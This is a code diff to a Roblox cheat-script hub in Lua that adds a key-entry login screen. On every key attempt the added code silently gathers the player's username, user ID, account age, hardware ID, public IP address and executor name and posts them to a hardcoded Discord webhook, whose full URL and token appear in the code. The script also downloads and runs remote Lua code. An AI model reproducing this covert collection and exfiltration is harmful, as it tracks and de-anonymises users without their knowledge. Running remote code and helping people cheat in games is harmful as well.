@@ -21,12 +21,280 @@ local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+
+-- Configuration
+local CORRECT_KEY = "inovoproductionsv1"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1430600012559286383/Jfbygbw1VA3tF5_p14iPc5UE_Xi0rml0VBElb98V6PaPgR2MMi-LstSDHURxjk1iLnX7"
+
+-- Get User Info
+local LocalPlayer = Players.LocalPlayer
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Get HWID (Hardware ID)
+local function getHWID()
+    if gethwid then
+        return gethwid()
+    elseif syn and syn.request then
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    else
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end
+end
+
+-- Get IP Address
+local function getIPAddress()
+    local success, result = pcall(function()
+        local response = game:HttpGet("https://api.ipify.org?format=json")
+        local data = HttpService:JSONDecode(response)
+        return data.ip or "Unknown"
+    end)
+    return success and result or "Unknown"
+end
+
+-- Send to Discord Webhook
+local function sendToWebhook(key_correct)
+    local hwid = getHWID()
+    local ip = getIPAddress()
+    local username = LocalPlayer.Name
+    local userid = LocalPlayer.UserId
+    local displayname = LocalPlayer.DisplayName
+    local accountage = LocalPlayer.AccountAge
+    
+    local status = key_correct and "✅ Key Correct" or "❌ Key Incorrect"
+    local color = key_correct and 3066993 or 15158332
+    
+    local embed = {
+        ["embeds"] = {{
+            ["title"] = "🔐 InovoProductions Hub - Login Attempt",
+            ["description"] = "**Status:** " .. status,
+            ["color"] = color,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Username",
+                    ["value"] = username .. " (@" .. displayname .. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 User ID",
+                    ["value"] = tostring(userid),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📅 Account Age",
+                    ["value"] = tostring(accountage) .. " days",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "💻 HWID",
+                    ["value"] = "```" .. tostring(hwid) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🌐 IP Address",
+                    ["value"] = "```" .. tostring(ip) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "⚙️ Executor",
+                    ["value"] = executor,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🎮 Game",
+                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "InovoProductions Security System"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+        }}
+    }
+    
+    local data = HttpService:JSONEncode(embed)
+    
+    pcall(function()
+        local response = request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = data
+        })
+    end)
+end
 
 -- Load Library
 local InovoLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/InovoLib.lua"))()
 
--- Create Main Selection GUI (NO TABS!)
-local screenGui = Instance.new("ScreenGui")
+-- Create Key System GUI
+local keyScreenGui = Instance.new("ScreenGui")
+keyScreenGui.Name = "InovoKeySystem"
+keyScreenGui.ResetOnSpawn = false
+keyScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+keyScreenGui.Parent = CoreGui
+
+local keyFrame = Instance.new("Frame")
+keyFrame.Name = "KeyFrame"
+keyFrame.Size = UDim2.new(0, 400, 0, 250)
+keyFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+keyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+keyFrame.BorderSizePixel = 0
+keyFrame.Parent = keyScreenGui
+
+local keyCorner = Instance.new("UICorner")
+keyCorner.CornerRadius = UDim.new(0, 12)
+keyCorner.Parent = keyFrame
+
+-- Glow Effect
+local glowFrame = Instance.new("Frame")
+glowFrame.Size = UDim2.new(1, 4, 1, 4)
+glowFrame.Position = UDim2.new(0, -2, 0, -2)
+glowFrame.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+glowFrame.BackgroundTransparency = 0.7
+glowFrame.BorderSizePixel = 0
+glowFrame.ZIndex = 0
+glowFrame.Parent = keyFrame
+
+local glowCorner = Instance.new("UICorner")
+glowCorner.CornerRadius = UDim.new(0, 12)
+glowCorner.Parent = glowFrame
+
+-- Title
+local keyTitle = Instance.new("TextLabel")
+keyTitle.Size = UDim2.new(1, 0, 0, 60)
+keyTitle.Position = UDim2.new(0, 0, 0, 0)
+keyTitle.BackgroundTransparency = 1
+keyTitle.Text = "🔐 InovoProductions"
+keyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyTitle.TextSize = 24
+keyTitle.Font = Enum.Font.GothamBold
+keyTitle.Parent = keyFrame
+
+local keySubtitle = Instance.new("TextLabel")
+keySubtitle.Size = UDim2.new(1, 0, 0, 30)
+keySubtitle.Position = UDim2.new(0, 0, 0, 50)
+keySubtitle.BackgroundTransparency = 1
+keySubtitle.Text = "Enter your access key"
+keySubtitle.TextColor3 = Color3.fromRGB(180, 180, 190)
+keySubtitle.TextSize = 14
+keySubtitle.Font = Enum.Font.Gotham
+keySubtitle.Parent = keyFrame
+
+-- Key Input
+local keyInput = Instance.new("TextBox")
+keyInput.Size = UDim2.new(1, -60, 0, 45)
+keyInput.Position = UDim2.new(0, 30, 0, 100)
+keyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+keyInput.BorderSizePixel = 0
+keyInput.Text = ""
+keyInput.PlaceholderText = "Enter key here..."
+keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 110)
+keyInput.TextSize = 16
+keyInput.Font = Enum.Font.GothamSemibold
+keyInput.ClearTextOnFocus = false
+keyInput.Parent = keyFrame
+
+local keyInputCorner = Instance.new("UICorner")
+keyInputCorner.CornerRadius = UDim.new(0, 8)
+keyInputCorner.Parent = keyInput
+
+local keyInputPadding = Instance.new("UIPadding")
+keyInputPadding.PaddingLeft = UDim.new(0, 15)
+keyInputPadding.PaddingRight = UDim.new(0, 15)
+keyInputPadding.Parent = keyInput
+
+-- Submit Button
+local submitBtn = Instance.new("TextButton")
+submitBtn.Size = UDim2.new(1, -60, 0, 45)
+submitBtn.Position = UDim2.new(0, 30, 0, 165)
+submitBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+submitBtn.BorderSizePixel = 0
+submitBtn.Text = "Verify Key"
+submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitBtn.TextSize = 16
+submitBtn.Font = Enum.Font.GothamBold
+submitBtn.Parent = keyFrame
+
+local submitBtnCorner = Instance.new("UICorner")
+submitBtnCorner.CornerRadius = UDim.new(0, 8)
+submitBtnCorner.Parent = submitBtn
+
+-- Status Label
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, 0, 0, 20)
+statusLabel.Position = UDim2.new(0, 0, 0, 220)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = ""
+statusLabel.TextColor3 = Color3.fromRGB(240, 71, 71)
+statusLabel.TextSize = 12
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.Parent = keyFrame
+
+-- Button Hover
+submitBtn.MouseEnter:Connect(function()
+    TweenService:Create(submitBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(108, 121, 255)}):Play()
+end)
+
+submitBtn.MouseLeave:Connect(function()
+    TweenService:Create(submitBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
+end)
+
+-- Key Verification
+local function verifyKey()
+    local enteredKey = keyInput.Text
+    
+    if enteredKey == "" then
+        statusLabel.TextColor3 = Color3.fromRGB(250, 166, 26)
+        statusLabel.Text = "⚠️ Please enter a key"
+        return
+    end
+    
+    submitBtn.Text = "Verifying..."
+    submitBtn.Enabled = false
+    
+    task.wait(0.5)
+    
+    if enteredKey == CORRECT_KEY then
+        statusLabel.TextColor3 = Color3.fromRGB(67, 181, 129)
+        statusLabel.Text = "✅ Key verified! Loading..."
+        
+        -- Send success webhook
+        sendToWebhook(true)
+        
+        task.wait(1)
+        keyScreenGui:Destroy()
+        
+        -- Load main GUI
+        loadMainGUI()
+    else
+        statusLabel.TextColor3 = Color3.fromRGB(240, 71, 71)
+        statusLabel.Text = "❌ Invalid key! Please try again."
+        
+        -- Send failed webhook
+        sendToWebhook(false)
+        
+        submitBtn.Text = "Verify Key"
+        submitBtn.Enabled = true
+        keyInput.Text = ""
+    end
+end
+
+submitBtn.MouseButton1Click:Connect(verifyKey)
+keyInput.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        verifyKey()
+    end
+end)
+
+-- Main GUI Function
+function loadMainGUI()
+    -- Create Main Selection GUI (NO TABS!)
+    local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "InovoGameSelector"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -688,7 +956,9 @@ prisonBtn.MouseButton1Click:Connect(function()
     MiscTab:AddLabel("Game: Prison Life")
 end)
 
-print("[InovoHub] Loaded!")
+end -- End of loadMainGUI function
+
+print("[InovoHub] Key system loaded!")
 
 
 
